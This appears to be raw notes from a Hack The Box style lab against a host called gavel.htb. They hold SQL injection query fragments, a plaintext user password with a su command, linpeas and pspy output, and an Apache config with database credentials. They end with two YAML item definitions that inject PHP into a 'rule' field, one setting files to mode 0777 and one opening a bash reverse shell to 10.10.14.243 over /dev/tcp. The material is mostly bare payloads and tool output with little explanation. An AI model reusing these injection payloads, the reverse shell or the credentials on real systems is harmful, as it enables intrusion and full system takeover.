---
tags:
  - linux
---

```sql
SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC



Select $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC
Select CONCAT(item_name,':',quantity) From 
```

 `auctioneer : midnight1`
```
www@ ; su auctioneer
midnight1 
```


```
root         842  0.0  0.0  82840  3788 ?        Ssl  12:58   0:00 /usr/sbin/irqbalance --foreground
root         843  0.0  0.4  32800 19628 ?        Ss   12:58   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         845  0.0  0.1 234536  6648 ?        Ssl  12:58   0:00 /usr/libexec/polkitd --no-debug
syslog       846  0.0  0.1 222404  5924 ?        Ssl  12:58   0:03 /usr/sbin/rsyslogd -n -iNONE
root         847  0.0  0.1  15388  7420 ?        Ss   12:58   0:00 /lib/systemd/systemd-logind
root         848  0.0  0.3 392540 12696 ?        Ssl  12:58   0:00 /usr/libexec/udisks2/udisksd
root         881  0.0  0.2 318000 11928 ?        Ssl  12:58   0:00 /usr/sbin/ModemManager
root        1015  0.0  0.0   7372  3528 ?        Ss   12:58   0:07 /bin/bash /root/scripts/auction_watcher.sh
root       40878  0.0  0.0   5772  1008 ?        S    16:22   0:00  _ sleep 1
root        1016  0.0  0.0  19128  3868 ?        Ss   12:58   0:00 /opt/gavel/gaveld
root        1020  0.0  0.0   6920  2944 ?        Ss   12:58   0:00 /usr/sbin/cron -f -P
root        1023  0.2  0.4  26784 18416 ?        Ss   12:58   0:31 python3 /root/scripts/timeout_gavel.py
root        1059  0.0  0.0   6176  1060 tty1     Ss+  12:58   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux


╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
═╣ Systemd version and vulnerabilities? .............. 249.11
3.16
═╣ Services running as root? .....
═╣ Running services with dangerous capabilities? ...
═╣ Services with writable paths? . apache2.service: Uses relative path 'start' (from ExecStart=/usr/sbin/apachectl start)
dbus.service: Uses relative path '@dbus-daemon' (from ExecStart=@/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only)
mysql.service: Uses relative path 'pre' (from ExecStartPre=/usr/share/mysql/mysql-systemd-start pre)
networkd-dispatcher.service: Uses relative path '$networkd_dispatcher_args' (from ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args)
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)
timeout_gavel.service: Uses relative path 'python3' (from ExecStart=/usr/bin/env python3 /root/scripts/timeout_gavel.py)


══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Aug  4 16:02 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Aug  4 16:02 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 29 Jul 29 16:44 /etc/apache2/sites-enabled/gavel.conf -> ../sites-available/gavel.conf
<VirtualHost *:80>
    ServerName gavel.htb
    DocumentRoot /var/www/html/gavel
    SetEnv DB_HOST 127.0.0.1
    SetEnv DB_NAME gavel
    SetEnv DB_USER gavel
    SetEnv DB_PASS gavel
    ErrorLog ${APACHE_LOG_DIR}/gavel_error.log
    SetEnvIf Request_URI "^/server-status$" dontlog
    CustomLog ${APACHE_LOG_DIR}/gavel_access.log combined env=!dontlog
    <Directory /var/www/html/gavel>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    RewriteEngine on
    RewriteCond %{HTTP_HOST} !^gavel\.htb$ [NC]
    RewriteRule ^/(.*)$ http://gavel.htb/$1 [R=301,L]
</VirtualHost>



2025/11/30 19:59:18 CMD: UID=33    PID=108075 | /usr/bin/php /var/www/html/gavel/includes/auction_watcher.php
2025/11/30 19:59:18 CMD: UID=0     PID=108076 | /bin/bash /root/scripts/auction_watcher.sh
2025/11/30 19:59:19 CMD: UID=0     PID=108078 | sudo -u www-data /usr/bin/php /var/www/html/gavel/includes/auction_watcher.php
```

```
name: "Dropper"
description: "drop php file"
image: "img.jpg"
price: 1
rule_msg: "dropped"
rule: "$p='/opt/gavel/.config';foreach(scandir($p) as $i){if($i!='.'&&$i!='..'){$f=\"$p/$i\";chmod($f,0777);}}return true;"
```

```
name: "Dropper"
description: "drop php file"
image: "img.jpg"
price: 1
rule_msg: "dropped"
rule: "shell_exec('/usr/bin/bash -i >& /dev/tcp/10.10.14.243/4442 0>&1')"
```